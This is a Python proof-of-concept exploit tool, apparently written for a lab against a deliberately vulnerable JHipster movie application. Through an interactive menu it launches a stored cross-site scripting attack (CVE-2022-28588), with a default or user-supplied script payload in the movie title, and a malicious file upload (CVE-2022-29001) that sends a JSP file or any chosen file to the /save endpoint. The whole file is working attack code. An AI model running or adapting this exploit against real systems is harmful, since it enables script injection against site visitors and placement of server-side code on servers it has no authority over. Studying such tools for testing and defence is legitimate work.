import requests
import inquirer
from Sample.Logger import Logger

class Exploiter:
    '''
    Exploiter. This class contains the methods used to exploit the vulnerability
    in JHipster.
    '''
    
    def __init__(self, HOST: str, PORT: int):
        '''
        Loading information and initializing targets.
        '''
        self.logger = Logger()
        self.logger.print_banner()    
        self.target = f'http://{HOST}:{PORT}'
        self.movie = {
            "director": "Vulnerable",
            "description": "CVE-2022-28588 and CVE-2022-29001",
            "overallRating": "9",
            "publishDate": "2023-03-01"
        }
            
    
    def set_injection(self, xss: any) -> None:
        '''
        Set the stored XSS injection script
        '''
        if xss:
            self.movie['title'] = xss
        else: 
            self.movie['title'] = "Spirited Away"
        return self
    
    def set_file(self, path: any) -> None:
        '''
        Set the file path payload.
        '''
        if path: 
            with open(path, "rb") as file:
                self.file = {"imageFile": (path.split("/")[-1], file.read())}
        else: 
            with open("./Payloads/safeimage.jpg", "rb") as file:
                self.file = {"imageFile": ("safeimage.jpg", file.read())}
        return self
    
    def attack(self) -> None:
        
        # Making malicious request: POST http://localhost:8080/save
        self.logger.log('Making malicious POST request.')
        self.logger.request("POST", f'{self.target}/save')
        response = requests.post(f'{self.target}/save', data=self.movie, files=self.file)
        if response.json()['success'] != True:
            self.logger.warning("Request failed. An error occurred.")
            return
        self.logger.success("Malicious payload injected <.< !")
        self.logger.log("Try to visit http://localhost:8080/movies\n\n")
        return
        
        
        
    def run(self) -> None:
        '''
        Running the exploit. This method will use the requests library to create a POST request
        to the vulnerable endpoint and inject malicious payloads.
        '''
        
        menu = [
            inquirer.List(
                'attack', 
                message = "Select the attack", 
                choices = ["Default XSS (CVE-2022-28588)", "Customized XSS (CVE-2022-28588)", "Default file upload (CVE-2022-29001)", "Customized file upload (CVE-2022-29001)", "Exit"]),
        ]
        choice = inquirer.prompt(menu)["attack"]
            
        # End the attack
        if choice == "Exit":
            self.logger.success("Goodbye.")  
            
        # Start with default stored XSS
        elif choice == "Default XSS (CVE-2022-28588)":
            self.set_injection("<script>alert('CVE-2022-28588')</script>")
            self.set_file(None)
            self.attack()
            
        # Start with custom stored XSS
        elif choice == "Customized XSS (CVE-2022-28588)":
            self.logger.log("Insert stored XSS payload.")
            payload = input("> ")
            self.set_injection(payload)
            self.set_file(None)
            self.attack()
            
        # Start with default file injection
        elif choice == "Default file upload (CVE-2022-29001)":
            self.set_injection(None)
            self.set_file("./Payloads/injection.jsp")
            self.attack()
            
        # Start with custom file injection
        elif choice == "Customized file upload (CVE-2022-29001)":
            self.logger.log("Insert file path.")
            payload = input("> ")
            self.set_injection(None)
            self.set_file(payload)
            self.attack()
            
        
            
    
        
        
        
        

        
        
        
    
